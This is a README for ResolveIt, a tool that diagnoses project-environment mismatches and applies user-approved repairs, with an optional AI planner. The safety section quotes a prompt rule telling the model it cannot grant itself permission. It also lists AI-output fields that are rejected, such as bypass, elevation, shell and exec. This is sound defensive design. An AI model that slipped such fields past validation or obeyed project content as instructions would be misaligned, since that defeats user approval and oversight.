# ResolveIt

A local-first, IDE-integrated **project environment diagnosis and repair tool**.

> **Status: pre-release (0.0.1).** The deterministic core is complete, tested, and
> stable. The VS Code UI provides a single focused **ResolveIt Workflow Panel**
> (on-demand WebviewPanel) as the primary experience.

---

## Table of contents

- [Overview](#overview)
- [Why ResolveIt exists](#why-resolveit-exists)
- [What it does](#what-it-does)
- [Core workflow](#core-workflow)
- [Architecture](#architecture)
- [Safety model](#safety-model)
- [Supported ecosystems](#supported-ecosystems)
- [AI providers](#ai-providers)
- [Ollama setup](#ollama-setup)
- [Installing ResolveIt Core](#installing-resolveit-core)
- [CLI usage](#cli-usage)
- [Installing the VS Code extension](#installing-the-vs-code-extension)
- [Development mode](#development-mode)
- [VS Code usage](#vs-code-usage)
- [Repair approval](#repair-approval)
- [Verification](#verification)
- [Example workflow](#example-workflow)
- [Test fixtures](#test-fixtures)
- [Testing](#testing)
- [Docker support](#docker-support)
- [UI / UX history](#ui--ux-history)
- [Current UI status](#current-ui-status)
- [Project structure](#project-structure)
- [Development](#development)
- [Phase history](#phase-history)
- [Known limitations](#known-limitations)
- [Developer handoff](#developer-handoff)
- [Contributing](#contributing)
- [License](#license)

---

## Overview

ResolveIt answers one question: **"Why does this project not build or run on this
machine, and what is the safest concrete change that would fix it?"**

It does this in a fixed, auditable order:

1. Read the project's declared requirements from its manifests and lockfiles.
2. Inspect the actual development environment (runtimes, tools, package managers, container state).
3. Compare the two and emit **deterministic** diagnostics with evidence.
4. Optionally ask an AI provider to propose a structured repair plan.
5. Ask the user to approve each proposed change individually.
6. Execute only validated, allowlisted repairs through registered tools.
7. Re-run verification.
8. Report resolved, or re-plan.

**ResolveIt is NOT a general coding assistant.** It does not write features, answer
general questions, refactor, or edit code on request. Its focus is:

- project/environment compatibility
- runtime detection
- toolchain detection
- dependency/requirement analysis
- deterministic diagnostics
- AI-assisted repair planning
- safe repair execution
- explicit user approval
- verification
- auditability

Everything it decides is derived from evidence it can show you. When it does not know
something, it says `unknown` — it does not guess.

---

## Why ResolveIt exists

Setting up a project is where a lot of engineering time disappears, and the failure
modes are boring and repetitive:

- the project needs Python 3.11 but the machine only has 3.9
- `Cargo.lock` pins a version the local toolchain cannot build
- a `go.work` references a module that no longer exists
- a Compose file runs privileged and nobody noticed

Generic AI coding assistants can *guess* at these, and a generic scripting tool will
happily run whatever fix it invents. Neither is auditable, and neither asks first.

ResolveIt deliberately does less, and does it in a way you can inspect:

- diagnostics are **deterministic** — the same project and machine produce the same
  findings, with evidence attached
- repairs are **structured actions**, not shell strings
- every modification requires **explicit, per-action approval**
- every repair is followed by **verification**, so "success" is never assumed
- everything important is **written to a sanitized audit log**

The design principle is that a tool that changes your machine is only trustworthy if
you can always answer "what did it do, and who said yes?"

---

## What it does

**Does:**

- Discover projects, manifests, languages, and configuration in a workspace
  (including multi-project and nested-project layouts)
- Detect installed runtimes, developer tools, package managers, OS, and Docker state
- Parse 17 requirement parsers covering 12 ecosystem identifiers across Python, Node,
  Java (Maven/Gradle), Go, Rust, C/C++, .NET, Ruby, PHP, and Docker/Compose
- Produce deterministic diagnostics across 8 rule categories (runtime, toolchain,
  dependency, build, container, Docker security, project, cross-project)
- Plan repairs from diagnostics, gated by the real tool validators
- Execute repairs through 4 allowlisted tools (create file, modify file, install
  dependency, create Python venv) with snapshots and audit records
- Verify repairs by re-running diagnostics plus filesystem-only targeted checks
- Run an agent loop (observe → analyze → plan → approve → act → verify → re-plan)
- Accept an optional AI planning layer (No AI / Local AI / External AI) that proposes
  structured actions which the Core then validates independently
- Statically analyze Docker/Compose configuration for security misconfigurations
- Redact secrets from logs, audit records, errors, AI context, and UI output

**Does not do:**

- Write application code or answer general questions
- Solve dependencies (no version solver, no conflict resolution)
- Install or upgrade runtimes, toolchains, or system software automatically
- Remediate Docker findings automatically
- Scan for CVEs or run a dedicated secret scanner
- Elevate privileges or run `sudo`
- Execute anything the user did not approve

---

## Core workflow

```
Analyze a project's requirements
        ↓
Inspect the development environment
        ↓
Detect mismatches / problems
        ↓
Produce deterministic diagnostics
        ↓
Optionally use AI to propose repairs
        ↓
Ask the user for explicit approval
        ↓
Execute only validated / allowlisted repairs
        ↓
Verify the result
        ↓
Resolve or re-plan
```

In code, the agent state machine is:

```
OBSERVE → ANALYZE → PLAN → REQUEST USER APPROVAL → ACT → VERIFY → RESOLVED
                                                                          ↓
                                                                       RE-PLAN
```

---

## Architecture

```
VS Code Extension
        │
        ▼
ResolveIt Core
        │
        ├── Workspace Manager        (src/core/workspace-manager.ts)
        ├── Project Scanner          (src/scanners/)
        ├── Environment Intelligence  (src/environment/, src/environment/adapters/)
        ├── Diagnostic Engine        (src/diagnostics/, src/diagnostics/rules/)
        ├── Repair Engine            (src/repair/, src/repair/tools/)
        ├── Verification Engine      (src/agent/verifier.ts)
        ├── Safety / Permission Layer(src/safety/)
        └── Audit Logger             (src/repair/index.ts — AuditLoggerImpl)
                │
                ├── Language / Ecosystem Analyzers (src/requirements/parsers/)
                ├── Environment Adapters          (src/environment/adapters/)
                └── Tool Registry                 (src/repair/registry.ts)

Agent Engine
        │
        └── AI Provider Abstraction  (src/ai/, src/ai/providers/)
                ├── No AI      (src/ai/providers.ts)
                ├── Local AI   (src/ai/providers/local.ts)
                └── External AI(src/ai/providers/external.ts)
```

**The VS Code extension is a thin client. The Core is authoritative.**

- The extension imports Core source directly through the public API (`src/index.ts`)
  and bundles it with esbuild; there is no second diagnostic, repair, or AI engine
  in `vscode/`.
- The extension **must not directly execute repair commands**. It has no shell
  execution path for repairs. Approvals are *collected* in the UI and passed down as
  approved action IDs; the Core `PermissionManager` and `RepairExecutor` re-check
  every one of them and can still refuse.
- All security decisions live in the Core. The UI cannot escalate, bypass, or widen
  a permission level.

---

## Safety model

ResolveIt follows:

```
OBSERVE
   ↓
ANALYZE
   ↓
PLAN
   ↓
REQUEST USER APPROVAL
   ↓
ACT
   ↓
VERIFY
   ↓
RESOLVED
   or
RE-PLAN
```

### Key safety principles

- **Read-only discovery can happen automatically.** Scanning, environment probing,
  and requirement parsing never modify anything.
- **Project modifications require explicit approval.** Dependency installs, file
  creation/modification, and venv creation all stop at the approval gate.
- **System modifications require explicit approval**, and in practice ResolveIt does
  not automate them at all — they are reported as manual actions.
- **AI output is untrusted.** It is treated as data, never as instructions. Project
  content (READMEs, comments, manifests) is likewise evidence, not authority.
- **AI cannot execute arbitrary shell commands.** AI can only name a registered tool
  and pass allowlisted structured parameters.
- **Repair actions are validated** — by the tool's own `validate()` before execution,
  in addition to plan-level validation.
- **Package managers and executables are allowlisted.** `InstallDependencyTool`
  constructs commands internally from a fixed ecosystem table
  (`npm`, `pip`, `cargo`, `go`, `composer`, `bundle`); arbitrary command strings are
  never accepted.
- **Paths are contained within the workspace** where required, using canonical
  resolution, `path.relative` segment checks (not string prefixes), and symlink
  fail-closed behaviour.
- **Verification occurs after repairs.** Success is reported only when verification
  passes: *approved ≠ executed ≠ succeeded ≠ verified*.
- **Failed repairs must not appear successful.** A repair that throws or exits
  non-zero is recorded as a failure with its error text.
- **Denied repairs must not execute.** The executor runs a tool only on an exact
  `allowed` decision; denials produce a `failure` audit record and no side effects.
- **Audit records track important operations.** JSONL entries under
  `.resolveit/audit/` correlate `runId → plan → action → approval → execution → verification`.
- **Secrets are redacted.** Sensitive parameter keys, bearer/basic tokens, API keys,
  and private-key blocks are redacted from audit records, logs, errors, child-process
  output, agent snapshots, and AI context.
- **`.env` files are not parsed** as requirements, and are excluded from scanning.
- **Dangerous Docker configurations are diagnosed but not automatically remediated.**
  Docker security findings carry no remediation candidates, so no repair tool can
  apply them.

### Actual architecture of the permission flow

```
UI
  ↓
CoreClient
  ↓
PermissionManager
  ↓
RepairExecutor
  ↓
VerificationEngine
```

### Action levels

| Level | Examples | Approval |
|-------|----------|----------|
| Read-only | Inspect files, environment, tools, dependencies, run safe diagnostics | Implicit (auto-approved by policy) |
| Project modification | Install dependencies, modify/create project files, create a Python venv | Explicit user approval |
| System-level modification | Installing system software, changing system configuration, runtime upgrades | Explicit user approval — and in practice reported as a manual action, never automated |

Higher-risk actions require explicit user approval. The permission layer enforces this
at the API boundary, not in the UI.

### Limits

`src/safety/limits.ts` bounds untrusted input: paths 1024 chars; repair content
256 KiB; AI responses 256 KiB / 16 actions / 16 KiB per parameter set / depth 5; audit
query 200 results / 5 MiB scanned; command output 256 KiB / timeout 120 s;
requirement files 1 MiB / 500 files. Oversized input degrades to an explicit warning
or manual action — never a silently truncated security decision.

---

## Supported ecosystems

ResolveIt performs **static manifest and lockfile analysis** with version-constraint
matching. **It does NOT implement a full dependency solver.** There is no version
resolution, no conflict solving, and no lockfile rewriting.

17 parser classes are registered by filename in `src/requirements/index.ts`
(`registerDefaultParsers`), covering 12 ecosystem identifiers:

| Ecosystem | Files parsed | Notes |
|---|---|---|
| **Python** | `requirements.txt`, `pyproject.toml` (PEP 621 + Poetry), `poetry.lock`, `setup.cfg`, `setup.py`, `Pipfile`, `Pipfile.lock` | `setup.py` is parsed **statically, never executed**; dynamic declarations produce a `DYNAMIC_DECLARATION` warning |
| **Node** | `package.json`, `package-lock.json`, `pnpm-lock.yaml`, `yarn.lock` | Volta pins, `packageManager`, dev/peer/optional deps; `bun.lockb` is recognized but not parsed (binary) |
| **Java / Maven** | `pom.xml`, `maven-wrapper.properties` | Property resolution, parent POM, dependency management, managed-scope exclusion |
| **Java / Gradle** | `build.gradle`(+`.kts`), `settings.gradle`(+`.kts`), `gradle.properties`, `gradle-wrapper.properties`, `libs.versions.toml` | Toolchain DSL, version catalogs, dynamic version markers |
| **Go** | `go.mod`, `go.work` | `require` blocks, `// indirect`, `replace`, `exclude`, workspace members. `go.sum` recognized but not parsed |
| **Rust** | `Cargo.toml`, `Cargo.lock` | Hyphenated names, workspace inheritance (without inventing versions), members, dev-deps |
| **C / C++** | `CMakeLists.txt`, `Makefile`, `meson.build`, `conanfile.txt`, `conanfile.py`, `conan.lock`, `vcpkg.json` | `find_package` versions/components, C/C++ standards, fallback deps |
| **.NET** | `*.csproj`, `*.fsproj`, `*.vbproj`, `*.sln`, `*.slnx`, `global.json`, `Directory.Packages.props`, `Directory.Build.props/targets`, `packages.config`, `nuget.config` | Multi-targeting, SDK pins with `rollForward`, central package management |
| **Ruby** | `Gemfile`, `Gemfile.lock`, `*.gemspec` | Groups, Ruby version constraints |
| **PHP** | `composer.json`, `composer.lock` | `ext-*` system tools, `require-dev`, both lock sections |
| **Docker / Compose** | `Dockerfile`, `Containerfile`, `*.dockerfile`, `docker-compose.{yml,yaml}`, `compose.{yml,yaml}` | Digests, `--platform`, registries with ports, `ARG`, build contexts, `build` blocks |

### Ecosystem limitations

- **No dependency solver.** ResolveIt reports what is declared and what the
  environment reports; it does not compute a resolution.
- **Dependency inventory is often `unknown`, never assumed.** Without a local package
  inventory, ResolveIt emits an informational diagnostic saying so. It does not
  pretend a dependency is installed or missing.
- **Dynamic/build-time discovery is limited.** `setup.py` logic, Gradle Kotlin/Groovy
  expressions, and arbitrary CMake code cannot be evaluated; they degrade to explicit
  warnings instead of invented versions.
- **Lockfile/transitive entries are never proposed for direct installation.** The
  deterministic planner emits manual guidance for them instead.
- **Automated installs cover 6 ecosystems only** (`npm`, `pip`, `cargo`, `go`,
  `composer`, `bundle`). Maven/Gradle/.NET/CMake dependencies are detected and
  reported, but not auto-installed.
- **Multi-project attribution** is per manifest directory: nested projects keep their
  own identity and files are never double-counted, but ResolveIt does not model
  inter-project dependency graphs.

---

## AI providers

Three modes. **No AI is the default** and requires no configuration, no keys, and no
network access. Switching modes never requires a code change.

### 1. No AI (default)

```bash
node dist/cli/index.js run --ai none
node dist/cli/index.js ai
```

Deterministic planning only. No network calls are made. This is the mode the entire
test suite and the release matrix exercise.

### 2. Local AI (Ollama-compatible)

Point ResolveIt at a local Ollama-compatible endpoint and choose your own model.
ResolveIt never downloads models and never starts the local service for you.

```powershell
$env:RESOLVEIT_AI_PROVIDER="local"
$env:RESOLVEIT_AI_MODEL="gemma3:4b"
$env:RESOLVEIT_AI_BASE_URL="http://localhost:11434"

node dist/cli/index.js ai
node dist/cli/index.js run --ai local
```

### 3. External AI (OpenAI-compatible)

Provide your own compatible endpoint, model, and API key. **Never commit credentials
to the repository — use environment variables only.**

```bash
export RESOLVEIT_AI_PROVIDER=external
export RESOLVEIT_AI_MODEL=your-model
export RESOLVEIT_AI_BASE_URL=https://your-gateway.example/v1
export RESOLVEIT_AI_API_KEY=...

node dist/cli/index.js ai
node dist/cli/index.js run --ai external
```

### Configuration precedence

Explicit CLI flags (`--ai`, `--ai-model`, `--ai-base-url`) → environment variables
(`RESOLVEIT_AI_PROVIDER`, `RESOLVEIT_AI_MODEL`, `RESOLVEIT_AI_BASE_URL`,
`RESOLVEIT_AI_API_KEY`, `RESOLVEIT_AI_TIMEOUT_MS`) → safe defaults. Unknown provider
values coerce to `none`. In VS Code, the `resolveit.ai.*` settings map onto the same
config object.

`resolveit ai` prints provider, model, base URL, timeout, `apiKeyConfigured` (a
boolean — never the key), and availability.

### How AI is used

- **AI receives structured evidence, not access to the machine.** The planning context
  contains workspace/project counts and names, runtime and tool names/versions,
  requirement descriptors, blocking diagnostics with expected/actual evidence, the tool
  allowlist, permission constraints, previous attempt fingerprints, and the last
  verification summary. File contents, environment variable values, and `.env` data
  are never included.
- **AI proposes structured actions** — a tool name plus parameters. The prompt states
  the boundary explicitly: *"You are proposing actions. You are not executing actions.
  You cannot grant yourself permission."*
- **AI permission levels are impossible to influence.** They come from the tool
  definition, never from the model, and any `permissionLevel`/`approval`/`bypass`/
  `elevation` key in AI output is rejected outright.

Validation pipeline for AI output:

```
AI output → JSON parse → schema check → known tool → parameter allowlist →
privilege/command-field rejection → workspace-root overwrite →
permission level from tool → tool.validate() → PermissionManager
```

- **Invalid, hostile, or malformed AI actions are rejected**, and the rejection
  reason is recorded on the plan. Rejection reasons include unknown tools, unsupported
  parameters, privilege-escalation attempts, arbitrary `command`/`shell`/`exec`/
  `spawn` fields, unsafe paths, oversized parameters, excessive nesting, and tool-level
  validation failures.
- **Deterministic fallback** happens when the AI is unavailable, times out, returns
  malformed output, refuses, is rate-limited, is unauthorized, or produces no valid
  actions. The agent then uses `DeterministicRepairPlanner` and logs an explicit
  fallback reason (`ai-unavailable`, `ai-error`, `ai-no-valid-actions`, `ai-all-retried`).
- **Partial validity is kept.** If some actions validate, the valid subset is used and
  the rejections are reported alongside it.

---

## Ollama setup

The configuration used during development and testing:

```bash
ollama list
```

```
NAME         ID              SIZE      MODIFIED
gemma3:4b    a2af6cc3eb7f    3.3 GB    6 months ago
```

Model used during testing:

```bash
ollama run gemma3:4b
```

ResolveIt base URL:

```
http://localhost:11434
```

Verify ResolveIt can see it:

```bash
node dist/cli/index.js ai
```

Actual verified output on this machine:

```
ResolveIt AI Provider
  Provider: local (Local AI Provider)
  Model: gemma3:4b
  Base URL: http://localhost:11434
  API key configured: no
  Timeout: 30000ms
  Available: yes
```

**Do not assume every model behaves the same.** Small local models frequently emit
malformed or schema-invalid plans; that is expected and is handled by validation and
deterministic fallback, not by trusting the model. A model that is available is not
necessarily a model that produces useful proposals.

---

## Installing ResolveIt Core

From a fresh clone:

```bash
git clone https://github.com/SahilGkar/ResolveIt.git
cd ResolveIt
npm install
npm run build
```

Requirements: **Node.js >= 20** (developed and validated on Node 24). There is no
postinstall step, no native build, and no network access at install time.

Confirm the CLI works:

```bash
node dist/cli/index.js --help
node dist/cli/index.js version
```

If `package.json` is present you can also run `npx resolveit --help`, which uses the
`bin.resolveit` entry point.

### Try it on a bundled fixture

```bash
node dist/cli/index.js scan tests/fixtures/integration/broken-python
node dist/cli/index.js diagnose --path tests/fixtures/integration/broken-python
node dist/cli/index.js run --path tests/fixtures/integration/broken-python --dry-run
```

---

## CLI usage

| Command | What it does | Options |
|---|---|---|
| `scan <workspace>` | Scan a workspace: projects, files, languages, markers, config | `--json`, `--max-depth <n>`, `--max-files <n>` |
| `environment` | Inspect the *current machine*: OS, runtimes, tools, package managers, Docker | `--json`, `--timeout <ms>` (default 30000) |
| `requirements` | Parse manifests/lockfiles and print requirements | `--json`, `--timeout <ms>` (default 60000), `--path <p>` |
| `diagnose` | Run the diagnostic engine over a workspace | `--json`, `--timeout <ms>` (default 60000), `--path <p>` (default `.`) |
| `repair` | Plan repairs from diagnostics and execute approved ones | `--json`, `--dry-run`, `--path <p>`, `--approve <action-id>` |
| `run` | Run the full agent lifecycle (observe → analyze → plan → approve → act → verify) | `--json`, `--dry-run`, `--path <p>`, `--approve <action-id>`, `--ai <provider>`, `--ai-model <m>`, `--ai-base-url <u>` |
| `ai` | Show AI provider configuration and availability (never prints secrets) | `--json` |
| `version`, `help` | Version / help | — |

### Notes

- `scan` takes the workspace as a **positional argument**, not `--path`:
  `node dist/cli/index.js scan .` or `node dist/cli/index.js scan C:\path\to\project`.
- `--path` is supported by `requirements`, `diagnose`, `repair`, and `run`, and
  defaults to `.` (the current directory).
- `environment` always inspects the machine ResolveIt is running on; it has no
  `--path`.
- `run` and `repair` **never execute anything unless you approve it.** Without
  `--approve <action-id>`, each action is printed for approval and skipped:

  ```
  Action requires approval:
    ID: action-…
    Type: install-dependency
    …
  To approve this action, run: resolveit run --approve <action-id>
  ```

- `--dry-run` prints the plan and stops before any modification. On `run`, a dry run
  finishes in state `awaiting-approval` with reason "Dry run stopped before modifications".

### Example: diagnose a project

```bash
node dist/cli/index.js diagnose --path tests/fixtures/integration/broken-python
```

```
ResolveIt Diagnostics

ERROR
  python version mismatch
  python version 3.14.2 does not satisfy requirement ==2.7.*: Expected version 2.7.*, got 3.14.2
  Source: requirement - python ==2.7.*
  Source: environment - python 3.14.2
    Expected: ==2.7.*
    Actual: 3.14.2
  Remediation candidates:
    - Install python ==2.7.* (confidence: 80%)
    - Upgrade python to ==2.7.* (confidence: 90%)

INFO
  Dependency: requests
  Dependency requests >=2.0 declared in pyproject.toml (project.dependencies). Status: unknown - no local package inventory available
  ...

Summary
  Total diagnostics: 2
  error: 1
  info: 1
```

---

## Installing the VS Code extension

**ResolveIt currently ships as a local VSIX. It is not published to the Marketplace.**

### Build the VSIX from this repository

```bash
cd vscode
npm install
npm run build
npm run package
```

This creates:

```
vscode/resolveit-0.0.1.vsix
```

The extension has its own isolated `node_modules` and does not depend on the root
install.

### Install in VS Code (GUI)

1. Open VS Code.
2. Open the Extensions view (`Ctrl+Shift+X`).
3. Click the three-dot menu (⋯) at the top of the view.
4. Select **"Install from VSIX..."**.
5. Select `C:\ResolveIt\vscode\resolveit-0.0.1.vsix` (or wherever you built it).
6. Install / update the extension.
7. Reload VS Code if prompted.

### PowerShell alternative

```powershell
code --install-extension C:\ResolveIt\vscode\resolveit-0.0.1.vsix --force
```

To remove it later:

```powershell
code --uninstall-extension resolveit-dev.resolveit
```

### A locally installed VSIX does NOT auto-update

The VSIX is a build artifact. Changing files under `vscode/src/` has **no effect**
until you rebuild and reinstall:

```bash
cd vscode
npm run build
npm run package
code --install-extension .\resolveit-0.0.1.vsix --force
```

`.vsix` files are git-ignored; never commit one.

---

## Development mode

**There is no launch configuration committed to this repository**, so pressing `F5`
in the `vscode/` folder will not start an Extension Development Host — VS Code has
no debug target to run.

**VSIX packaging is the currently validated installation path.** It is what was used
to produce and install the build described above.

If you want F5 development, you must add your own `vscode/.vscode/launch.json` with a
standard `Run Extension` configuration. Be aware that `.vscode/` is git-ignored at
the repository root, so such a file would be local-only and would not be shared with
the project partner unless that ignore rule is deliberately changed. This path has
**not** been validated as part of this handoff.

---

## VS Code usage

The extension contributes 19 commands and 1 entry point.

### Primary workflow: ResolveIt Workflow Panel

The main ResolveIt experience is a single, on-demand **WebviewPanel** that guides you through the complete workflow:

1. **Open a project folder** in VS Code (single folder; multi-root uses the first folder).
2. **Run "ResolveIt: Open Workflow"** from the Command Palette (`Ctrl+Shift+P`).
3. The workflow panel opens with these steps:

   **AI Mode** → Select how ResolveIt generates repair plans:
   - **No AI (Deterministic)** — built-in diagnostic rules only (default, no config needed)
   - **Local AI (Ollama-compatible)** — point at a local Ollama endpoint
   - **External AI (OpenAI-compatible)** — use an OpenAI-compatible API (configure via settings)

   **Project** → Shows the current workspace name and path.

   **Analyze** → Click **Analyze Project** to run the complete diagnostic pipeline:
   - Project discovered
   - Requirements scanned
   - Environment inspected
   - Diagnostics generated
   
   Clear progress indicators show each step. On failure, a meaningful error is shown with a **Retry** button — never an infinite loading state.

   **Status** → After analysis, a simple summary appears:
   - Requirements: total count
   - Issues found: total diagnostics
   - Blocking issues: error/critical severity count

   If blocking issues exist, **Generate Repair Plan** is available. If zero blocking issues, the project is healthy.

   **Repair Plan** → Generated by the deterministic planner or AI. Shows:
   - Total proposed changes
   - **Approve All** / **Deny All** bulk actions
   - Individual **Allow** / **Skip** per action with clear status badges:
     - ✓ Approved
     - ○ Awaiting approval
     - ✗ Denied
     - ⟳ Executing
     - ✓ Executed
     - ✗ Failed (with error)

   Approval counts update accurately (e.g., "3 / 12 approved").

   **Apply** → Click **Apply Approved Changes** to execute only validated, approved actions. Progress shows "N / M completed" with per-action status.

   **Verify** → Automatic verification runs after apply:
   - ✓ **Project Resolved** — all blocking issues cleared
   - ⚠ **Verification Failed** — shows resolved/remaining counts, offers **Return to Repair Plan**

   **Test Project** → After success, optionally run the project's test suite via the agent.

### Commands

| Command | ID |
|---|---|
| ResolveIt: Open Workflow | `resolveit.openWorkflow` |
| ResolveIt: Analyze Project | `resolveit.analyzeProject` |
| ResolveIt: Generate Repair Plan | `resolveit.generateRepairPlan` |
| ResolveIt: Apply Approved Repairs | `resolveit.applyApprovedRepairs` |
| ResolveIt: Allow Repair Action | `resolveit.approveAction` |
| ResolveIt: Skip Repair Action | `resolveit.skipAction` |
| ResolveIt: Review Problems | `resolveit.reviewProblems` |
| ResolveIt: Review Repairs | `resolveit.reviewRepairs` |
| ResolveIt: Ask AI | `resolveit.askAI` |
| ResolveIt: Retry AI | `resolveit.retryAI` |
| ResolveIt: Show Details | `resolveit.showDetails` |
| ResolveIt: Open AI Settings | `resolveit.openSettings` |
| ResolveIt: Scan Project | `resolveit.scan` |
| ResolveIt: Diagnose Project | `resolveit.diagnose` |
| ResolveIt: Run ResolveIt | `resolveit.run` |
| ResolveIt: Show Environment | `resolveit.environment` |
| ResolveIt: Show Requirements | `resolveit.requirements` |
| ResolveIt: Repair | `resolveit.repair` |
| ResolveIt: Verify | `resolveit.verify` |

All existing commands remain functional for advanced/Command Palette use.

### Settings

| Setting | Default | Meaning |
|---|---|---|
| `resolveit.ai.provider` | `none` | `none`, `local`, or `external` |
| `resolveit.ai.model` | `""` | Model name for the local/external provider |
| `resolveit.ai.baseUrl` | `""` | Ollama-compatible or OpenAI-compatible base URL |
| `resolveit.ai.timeout` | `30000` | AI request timeout (ms) |
| `resolveit.maxIterations` | `3` | Agent repair iterations before failing |

API keys are accepted **only** from environment variables, never from settings.

---

## Repair approval

Approval is per action, and it is a hard gate.

```
Diagnostic → proposed action → Allow/Skip (per action) → Apply Approved Repairs
          → PermissionManager re-check → tool.validate() → execute
```

- `Allow` records an approval in extension state. It does **not** execute anything.
- `Skip` records a denial. Denied actions never execute.
- `Apply Approved Changes` passes the approved action IDs down to the Core. The Core
  re-validates each one and can still refuse.
- If diagnostics have changed since the plan was generated, the plan is marked
  **stale** and applying is blocked until a fresh report is prepared.
- Actions whose IDs are not in the current plan are ignored (stale/hostile messages
  from the webview are dropped and logged).
- The legacy `ResolveIt: Repair` and `ResolveIt: Run ResolveIt` commands keep the
  older flow: the plan is printed to the `ResolveIt` output channel, then each action
  is confirmed via QuickPick (`Allow` / `Deny`).
- Manual-only items (runtime upgrades, toolchain installs, Docker findings) are
  reported with instructions and **never** run.

### The five states — do not confuse them

| Term | Meaning | Ran anything? |
|---|---|---|
| **Diagnostic** | A deterministic finding from the Core engine, with evidence | No |
| **AI proposal** | A structured suggestion produced by the AI layer, then validated by the Core | No |
| **Approved repair** | The user pressed `Allow` | No |
| **Executed repair** | The Core `RepairExecutor` ran the validated tool | Yes |
| **Verified repair** | Post-execution diagnostics + targeted checks confirm the issue is gone | Yes, and confirmed |

**Approved ≠ Executed ≠ Succeeded ≠ Verified.** A repair that fails stays failed; it
is never reported as resolved.

---

## Verification

Verification is not optional and never inferred from an exit code.

- After execution, the Core re-runs diagnostics and compares **stable diagnostic keys**
  (category/code/requirement/file — never random IDs) to produce `resolved` and
  `remaining` lists, plus any new regressions.
- Filesystem-only targeted checks run per action: created file exists with expected
  content, modified file contains the replacement, venv directory exists, installer
  outcome recorded (with its no-inventory limitation stated).
- Custom `VerificationRule`s run per action and AND into the result.
- **Success requires zero remaining blocking diagnostics and zero failed targeted
  checks.**
- In the agent loop, failed verification re-observes, re-analyzes, and re-plans with
  the new evidence, up to `maxIterations` (default 3), tracking failed action
  fingerprints so an identical unsuccessful action is not repeated.
- In the UI, `Verified` is shown only after verification passes. Note the known UI
  defect described in [Current UI Status](#current-ui-status) — the `Verified` badge
  on an individual card is currently too permissive.

---

## Example workflow

This is a realistic walkthrough based on the bundled `broken-python` fixture and the
actual CLI output. **It is an illustration of the flow, not a guarantee for every
project.**

**Project:** a Python application with `requires-python = "==2.7.*"`
**Requirement:** Python `==2.7.*`
**Environment:** Python 3.14.2

1. **Diagnostic** — Core emits a blocking diagnostic:

   ```
   RUNTIME_RUNTIME-VERSION_MISMATCH  (category: runtime, severity: error)
   python version 3.14.2 does not satisfy requirement ==2.7.*
   Expected: ==2.7.*   Actual: 3.14.2
   ```

2. **Remediation candidates** — Core attaches `Install python ==2.7.*` and
   `Upgrade python to ==2.7.*`, both at system-modification risk.

3. **AI (optional)** — if an AI provider is configured, it is given this evidence and
   may propose a structured action. If it proposes something invalid, Core rejects it
   and the deterministic plan is used instead.

4. **ResolveIt planning** — `DeterministicRepairPlanner` checks each candidate against
   the real tool validators. **Runtime and toolchain diagnostics have no controlled
   repair tool**, so they become a **manual action**, not an executable action. The
   run halts at `awaiting-approval` with an explanation. Nothing is executed.

   ```
   $ node dist/cli/index.js run --path tests/fixtures/integration/broken-python --dry-run
   AI planning fallback (ai-unavailable): AI unavailable, using deterministic planning
   Agent Run: run-…
   Status: awaiting-approval
   Reason: Dry run stopped before modifications
   Iterations: 1
   Manual actions required:
     - Manual action required: python version mismatch
       (No controlled repair tool for runtime diagnostics; system-level change
        requires explicit manual action)
   ```

**Where an automated repair *does* happen:** for dependency diagnostics in a
supported ecosystem, or for a missing required file, Core can plan an executable
`install-dependency` / `create-file` action. That action then follows the approval →
execute → verify path, e.g. installing a declared Python package with `pip`:

```
Diagnostic: DEPENDENCY_PACKAGE-DEPENDENCY_MISMATCH (or an unmet dependency)
Plan:       install-dependency { ecosystem: "pip", package: "<name>" }
User:       Allow
Repair:     InstallDependencyTool runs `pip install <name>` through the safe command runner
Verify:     diagnostics re-run; targeted check records the installer outcome
Result:     resolved, or remaining diagnostics reported honestly
```

**The example above deliberately shows the case ResolveIt refuses to automate.** A
runtime downgrade is not something this tool will do for you, and it says so instead
of guessing. Actual behavior depends on the project, the machine, and the AI
provider; dependency status without a local inventory is reported as `unknown`, not
as installed or missing.

---

## Test fixtures

Integration fixtures live in `tests/fixtures/integration/` and are copied into a
temporary directory by the tests, so the checked-in fixtures are never mutated.

| Fixture | Contents | What it actually demonstrates |
|---|---|---|
| `healthy-python` | `pyproject.toml`, `requires-python >=3.8` | Clean project: zero blocking diagnostics under a controlled environment; deterministic planner proposes nothing |
| `healthy-node` | `package.json`, `engines.node >=18` | Same for Node. This is also the workhorse fixture for staged repair, determinism, throwing-tool, and iteration-limit tests |
| `healthy-go` | `go.mod`, `go 1.21` | Clean Go project |
| `healthy-rust` | `Cargo.toml`, `rust-version 1.75` | Clean Rust project |
| `healthy-java` | `pom.xml`, `java.version 17` | Clean Maven project |
| `healthy-cpp` | `CMakeLists.txt`, `cmake_minimum_required 3.20` | Clean C++ project |
| `broken-python` | `pyproject.toml`, **`requires-python = "==2.7.*"`**, `dependencies = ["requests>=2.0"]` | A **runtime version mismatch**, not a missing package. Produces a blocking `runtime` diagnostic and a **manual action** — the deterministic planner deliberately proposes **no executable action** |
| `broken-node` | `package.json`, **`engines.node >=99.0.0`**, `lodash ^4.17.0` | An unsatisfiable runtime constraint: blocking diagnostic with evidence, plus a `system-modification` **manual action** and zero executable actions |
| `docker-security` | `compose.yaml` with `privileged: true` + Docker socket mount | Yields both `CONTAINER_PRIVILEGED_MODE` and `CONTAINER_DOCKER_SOCKET`, and every `container` diagnostic has **zero remediation candidates** (diagnostic-only) |
| `malformed-project` | Truncated `package.json` | Parse isolation: no crash, a `PROJECT_PARSE_ERROR` diagnostic with source and evidence |
| `multi-project` | `backend/` (Python), `frontend/` (Node), `worker/` (Go), `docker/` (Compose) | Project boundaries, per-file requirement ownership, no duplicate files, stable ordering |
| `nested-projects` | root `package.json` + `apps/inner/package.json` | Nested markers keep separate identity; no double-counting |
| `secrets` | `compose.yaml` with fake credentials | No leakage of fake values into diagnostics. **Note:** the fixture's `.env` file is excluded by the repository's `.gitignore`, so a fresh clone contains only `compose.yaml` — the assertions still hold, they simply have less to assert against |

### Where the automated repair flow *is* proven

The fixtures above prove the **diagnostic and manual-remediation** paths. The
**executed repair** path is proven in code, in `tests/integration-release.test.ts`
and `tests/agent-e2e.test.ts`, which use the real planner, executor, and verifier
against temporary directories:

- approved + verified → `resolved`, with a real file written and read back
- approved but the problem persists → verification **fails**, never a false success
- denied → nothing performed, not resolved
- a malicious package name → recorded as a failure with a validation error

### Security fixtures

`tests/fixtures/security/` contains deliberately hostile inputs used by
`tests/security-hardening.test.ts`:

| Fixture | Demonstrates |
|---|---|
